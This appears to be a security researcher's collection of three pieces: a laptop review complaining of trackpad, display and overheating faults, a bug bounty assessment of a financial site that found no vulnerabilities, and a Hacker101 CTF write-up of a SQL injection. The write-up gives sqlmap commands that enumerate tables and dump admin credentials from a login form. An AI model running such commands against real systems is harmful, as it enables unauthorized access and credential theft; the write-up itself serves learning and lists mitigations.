ASUS_ROG_STRIX_G18_REVIEW 

        I've had this machine for less than a year. Within the time that I had it, I've experienced multiple issues. 
For one, the product spontaneously terminates the Asus Precision Trackpad functionality. 
I have troubleshooted the issue and as of yet, the only thing that reactivates it is a soft reboot.
Additionally, the Windows 11 native OS is buggy. 
This is not a primary concern of mine as I use the machine for my security research work and I use VMware anyway, 
however for those who use the machine to game, this could definitely be problematic.
For clarification purposes, the machine's display screen on Windows 11 taskbar flickers displaying multiple taskbars on the screen.
The machine is also prone to overheating even when in eco mode. 
I've troubleshooted both issues and thus far, the only band-aid fix has been to hard reboot from BIOS. 
Thankfully, none of these issues besides the touchpad dying exist through VM isolation, 
so I assume this is an issue with the method in which the native Windows 11 OS is configured. 
The touchpad issue also can be perma-fixed by using an external mouse with the computer. 
Overall, this is a powerful yet unstable machine.
I purchased the G15 in 2022 and the performance otherwise was great, but the same issues existed. 
It would frequently overheat and blue screen.
I personally would not recommend ASUS ROG machines. !!! Review was written on the Best Buy (place of purchase) website !!!

Syfe Security Assessment 
Report Date: 3-23-2025 
Researcher: cybercossack 
Target: Syfe (https://www.syfe.com) 
Scope: Web application, API, authentication mechanisms 
Methodology: Manual and automated security testing 

1. Introduction This report details my security assessment of Syfe as part of HackerOne’s private bug bounty program. 
My primary objective was to identify potential vulnerabilities, focusing on IDOR, SSRF, XSS, and SQLi. Despite extensive testing, no vulnerabilities were found. 
This exercise served as a valuable learning experience, particularly in cloud-based security infrastructure, API security, and enumeration limitations. 

2. Enumeration & Initial Testing 
2.1 Web Application & API Reconnaissance 
• I attempted to access Syfe’s API endpoints through Burp Suite, but received a 404 Not Found response. 
• A likely cause of this error was the lack of valid credentials, as Syfe requires an account for API access.
• Creating an account was not an option, as Syfe mandates real ID verification, which raises privacy concerns, especially given its operational ties to Singapore and potential connections to China (as noted in historical data from the Wayback Machine). 
2.2 Automated Security Scanning I ran multiple security scanners to detect potential vulnerabilities: • Wapiti (Web vulnerability scanner) → No findings. 
• Kolimbus (RCE scanner) → No findings. 
• Burp Suite Scanner → No findings. 
• Nmap & Cloudflare Bypass Attempts 
→ Unsuccessful due to Cloudflare protection. 

3. Manual Testing 
3.1 Parameter-Based Attacks I manually tested various parameters to identify potential security flaws:
• IDOR → No sensitive object references were found. 
• SSRF → Attempts to trigger server-side requests failed. 
• XSS → No input reflection was detected. 
• SQLi → No injection points were identified.

4. Observations & Challenges 
• Extensive Security Measures: Syfe’s Cloudflare protection, real ID requirements, and locked-down API significantly reduce the attack surface. 
• High Report Volume: With 157 resolved reports, most low-hanging vulnerabilities are likely patched. 
• Credential Barrier: Full API testing requires a verified user account, limiting unauthenticated testing. 

5. Future Research & Recommendations If revisited in the future, the following areas could be explored:
• Authenticated Testing (if an account can be safely created). 
• Cloudflare Bypass Methods (advanced fingerprinting, WAF evasion techniques).
• Deep API Recon (once endpoint structure is better understood). 

6. Conclusion Despite not finding exploitable vulnerabilities, this engagement provided insights into high-security financial platforms and reinforced the importance of API authentication barriers in modern web applications. 
Given my current financial priorities, I am shifting focus to more promising targets but may return to Syfe as my expertise evolves.

            ## **SQL Injection - Hacker101 CTF Challenge**  

            ### **Overview**  
            This write-up documents a successful SQL Injection attack performed against a vulnerable login form in the [Hacker101 CTF](https://ctf.hacker101.com/). Using SQLMap, we were able to enumerate the database structure and dump credentials, leading to flag retrieval.  
            
            ### **Steps Taken**  
            
            1. **Identifying the Injection Point**  
               - Tested the login form with random credentials (`admin:test`).  
               - Captured the **POST request** using Burp Suite or a browser's developer tools.  
            
            2. **Enumerating the Database**  
               - Used SQLMap to determine the database system and check for injectable parameters:  
                 ```bash
                 sqlmap -u "https://target/login" --data "username=admin&password=test" --batch --dbs
                 ```  
               - Found that the backend was **MySQL (MariaDB fork)**.  
            
            3. **Enumerating Tables**  
               - Listed tables in the vulnerable database:  
                 ```bash
                 sqlmap -u "https://target/login" --data "username=admin&password=test" -D level2 --tables --batch
                 ```  
               - Found two tables: **admins** and **pages**.  
            
            4. **Extracting Credentials**  
               - Retrieved column names from the `admins` table:  
                 ```bash
                 sqlmap -u "https://target/login" --data "username=admin&password=test" -D level2 -T admins --columns --batch
                 ```  
               - Found columns: `id`, `username`, and `password`.  
            
            5. **Dumping Credentials**  
               - Extracted admin credentials using time-based blind SQL injection:  
                 ```bash
                 sqlmap -u "https://target/login" --data "username=admin&password=test" -D level2 -T admins --dump --time-sec=20 --batch
                 ```  
               - Credentials retrieved:  
                 ```
                 username: admin  
                 password: [hashed or plaintext]  
                 ```  
               - Used the credentials to log in and capture the flag.  
            
            ### **Lessons Learned**  
            - Time-based blind SQLi is **slow** but effective.  
            - Increasing `--time-sec` improves stability but lengthens execution time.  
            - Column enumeration may require `--no-cast` or `--hex` in case of errors.  
            - Always verify extracted credentials against the login page.  
            
            ### **Mitigation Strategies**  
            - Use **prepared statements** and **parameterized queries**.  
            - Implement **Web Application Firewalls (WAFs)** to detect and block SQLi attempts.  
            - Limit error messages to avoid revealing database structure.
